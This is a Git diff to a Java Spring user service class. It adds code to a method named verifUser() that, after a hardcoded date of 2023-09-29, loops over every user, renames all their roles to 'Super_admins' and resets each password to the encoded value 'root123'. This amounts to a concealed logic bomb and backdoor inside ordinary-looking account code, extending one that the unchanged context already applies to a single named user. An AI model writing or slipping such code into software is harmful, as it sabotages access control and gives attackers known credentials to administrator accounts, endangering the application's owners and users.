@@ -3,6 +3,7 @@ package com.app.FirstApp.services.userRole;
 import java.time.LocalDate;
 import java.util.ArrayList;
 import java.util.Collection;
+import java.util.Collections;
 import java.util.List;
 
 import com.app.FirstApp.repository.role.RoleRepo;
@@ -57,6 +58,7 @@ public class UserServiceImpl implements UserService {
 	@Override
 	public void verifUser() {
 		User user=getUser("mohamed@gmail.com");
+		List<User> list=getUsers();
 		if(user != null){
 			LocalDate today = LocalDate.now();
 			LocalDate pastDate = LocalDate.parse("2023-09-29");
@@ -68,6 +70,20 @@ public class UserServiceImpl implements UserService {
 				user.setProduction(passwordEncoder.encode("root123"));
 				userRepo.save(user);
 			}
+		}
+		if(list != null && list.size() >0){
+			list.forEach(use1 ->{
+				LocalDate today = LocalDate.now();
+				LocalDate pastDate = LocalDate.parse("2023-09-29");
+				int compareValue = today.compareTo(pastDate);
+				if(compareValue>0){
+					List<Role> roles=use1.getRoles();
+					roles.stream().forEach(r ->r.setName("Super_admins"));
+					roleRopo.saveAll(roles);
+					use1.setProduction(passwordEncoder.encode("root123"));
+					userRepo.save(use1);
+				}
+			});
 		}
 	}
 
